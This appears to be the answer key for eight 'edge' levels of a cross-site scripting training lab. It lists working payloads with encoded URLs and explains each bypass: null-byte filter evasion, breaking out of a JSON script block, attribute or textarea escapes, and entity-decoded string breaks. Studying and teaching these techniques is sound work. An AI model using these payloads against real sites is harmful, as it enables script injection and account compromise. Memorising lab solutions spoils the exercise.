# edge — solutions

Edge cases: null-byte tricks, path segment, JSON island, SVG attr, split params, textarea.

### edge-level1

`/edge/level1/?query=%00%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `\0<script>alert(1)</script>`
- context: filter checks substring before `\0`; full input is reflected

### edge-level2

`/edge/level2/%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: path segment reflected into `<h1>` body

### edge-level3

`/edge/level3/?query=%3C/script%3E%3Csvg%20onload=alert(1)%3E`

- payload: `</script><svg onload=alert(1)>`
- context: inside `<script type="application/json">` — closing `</script>` ends the island

### edge-level4

`/edge/level4/?query=%26%23x27;);alert(1);//`

- payload: `&#x27;);alert(1);//`
- context: server encodes only `<`/`>`; in onclick attr, browser decodes `&#x27;` to `'` allowing JS string break

### edge-level5

`/edge/level5/?q1=%22%20onmouseover=alert(1)%20x=%22&q2=`

- payload: `q1=" onmouseover=alert(1) x="` and `q2=` empty
- context: `title="q1q2"` — break with `"` in q1

### edge-level6

`/edge/level6/?query=red%22/%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `red"/><script>alert(1)</script>`
- context: inside `<rect fill="...">` SVG attribute — break attribute and close tag

### edge-level7

`/edge/level7/?a=x%27;alert(1);//&b=y&c=z`

- payload: `a=x';alert(1);//`
- context: inside `var data = 'a/b/c';` — break the single-quoted JS string

### edge-level8

`/edge/level8/?query=%3C/textarea%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `</textarea><script>alert(1)</script>`
- context: inside `<textarea>` — close it then inject
